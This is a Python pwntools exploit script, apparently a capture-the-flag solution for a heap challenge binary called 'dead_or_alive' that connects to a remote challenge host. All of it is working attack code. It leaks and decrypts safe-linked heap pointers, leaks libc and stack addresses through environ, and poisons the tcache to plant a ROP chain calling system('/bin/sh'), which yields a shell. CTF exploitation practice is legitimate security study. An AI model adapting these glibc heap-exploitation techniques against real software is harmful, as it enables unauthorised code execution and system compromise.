#!/usr/bin/python3
# Original writeup from Quang
from pwn import *

context.binary = exe = ELF('./dead_or_alive_patched', checksec=False)
libc = ELF('./glibc/libc.so.6', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, num: sla(msg, str(num).encode())
san = lambda msg, num: sa(msg, str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()

# def GDB():
#     if not args.REMOTE:
#         gdb.attach(p, gdbscript='''
#         b *create+272
#         b *delete+228
#         b view
#         c
#         ''')
#         input()

if args.REMOTE:
    host, port = '94.237.55.109 32468'.split()
    p = remote(host, port)
else:
    p = process(exe.path)
    input()
# GDB()

def create(siz, data):
    slan(b'==> ', 1)
    slan(b'(Zell Bars): ', 0x431)
    sa(b'(y/n): ', b'y')
    slan(b'size: ', siz)
    sa(b'description:\n', data)

def delete(idx):
    slan(b'==> ', 2)
    slan(b'ID: ', idx)

def view(idx):
    slan(b'==> ', 3)
    slan(b'ID: ', idx)


def decrypt(cipher):
    key = 0
    result = 0
    for i in range(6):
        bits = 64 - 12 * i
        if bits < 0: bits = 0
        result = ((cipher ^ key) >> bits) << bits
        key = result >> 12
    return result

create(0x30, b'\11')
create(0x30, b'\22')
create(0x30, b'\33')

delete(0)
delete(1)
delete(2)

create(0x20, b'\x01')

view(2)
ru(b'Description: ')
heap_leak = u64(r(6) + b'\0\0')
info('encrypt heap leak: ' + hex(heap_leak))

heap_base = decrypt(heap_leak) >> 12 << 12
info('heap base: ' + hex(heap_base))

create(0x60, b'\0')
create(0x60, b'\0')
create(0x60, b'\0')
create(0x60, b'\0')
create(0x60, b'\0')
create(0x60, b'\0')
create(0x60, b'\0')
create(0x60, p64(0)*9 + p64(0x21))
pause()
delete(2)
create(0x20, p64(heap_base + 0x470) + p64(0)*2 + p64(1))
pause()
delete(1)

create(0x30, b'\0')
pause()
delete(2)
create(0x20, p64(heap_base + 0x470) + p64(0)*2 + p64(1))
pause()
view(1)
ru(b'Description: ')
libc_leak = u64(r(6) + b'\0\0')
libc.address = libc_leak - 0x219ce0
info('libc leak: ' + hex(libc_leak))
info('libc base: ' + hex(libc.address))

delete(2)
create(0x20, p64(libc.sym.environ) + p64(0)*2 + p64(1))
view(1)
ru(b'Description: ')
stack_leak = u64(r(6) + b'\0\0')
info('stack leak: ' + hex(stack_leak))

ret_addr = ((heap_base + 0x530) >> 12) ^ (stack_leak - 0x138)

delete(10)
create(0x30, b'\0')
delete(6)
create(0x50, b'\0')
create(0x50, p64(0)*5 + p64(0x71) + p64(ret_addr) + p64(0))

pop_rdi = libc.address + 0x2a3e5
binsh = next(libc.search('/bin/sh'))
ret = libc.address + 0x29cd6

create(0x60, b'\0')
create(0x60, p64(0xcafebabe) + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(libc.sym.system))

p.interactive()
